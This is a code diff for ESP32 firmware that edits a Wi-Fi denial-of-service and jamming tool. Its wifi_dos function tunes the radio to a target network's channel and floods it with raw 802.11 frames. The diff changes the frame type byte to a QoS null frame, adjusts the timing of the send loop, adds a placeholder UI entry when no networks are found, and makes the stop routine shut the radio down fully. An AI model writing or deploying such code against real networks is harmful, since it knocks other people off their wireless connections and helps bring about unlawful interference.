@@ -9,6 +9,7 @@ int wifi_selected_index = -1;
 
 // ===== SCAN NETWORKS =====
 void scanNetworks() {
+    // Clear old network list
     if (wifi_networks) {
         delete[] wifi_networks;
         wifi_networks = nullptr;
@@ -24,9 +25,18 @@ void scanNetworks() {
 
     if (n <= 0) {
         Serial.println("[!] No networks found.");
+
+        // Allocate a dummy button for UI
+        wifi_networks = new String[1];
+        wifi_networks[0] = "No Networks Found";
+        wifi_button_texts = new const char*[1];
+        wifi_button_texts[0] = wifi_networks[0].c_str();
+        WIFI_BUTTON_COUNT = 1;
+        
         return;
     }
 
+    // Normal case: found networks
     wifi_networks = new String[n];
     wifi_button_texts = new const char*[n];
 
@@ -70,7 +80,7 @@ void wifi_dos() {
     esp_wifi_set_channel(targetNetwork.channel, WIFI_SECOND_CHAN_NONE);
 
     uint8_t nullPacket[24] = {
-        0x48, 0x00,
+        0xC8, 0x00,
         0x00, 0x00,
         0,0,0,0,0,0,
         0,0,0,0,0,0,
@@ -83,13 +93,14 @@ void wifi_dos() {
 
     for (int i = 0; i < 100; ++i) {
         esp_wifi_80211_tx(WIFI_IF_STA, nullPacket, sizeof(nullPacket), false);
-        delay(5);
+        delay(10);
     }
 }
 
 // ===== STOP FUNCTION =====
 void wifi_jamm_stop() { 
     Serial.println("[*] Stopping Wi-Fi Jamming...");
+    esp_wifi_stop();
     WiFi.mode(WIFI_MODE_NULL);
     delay(100);
 }
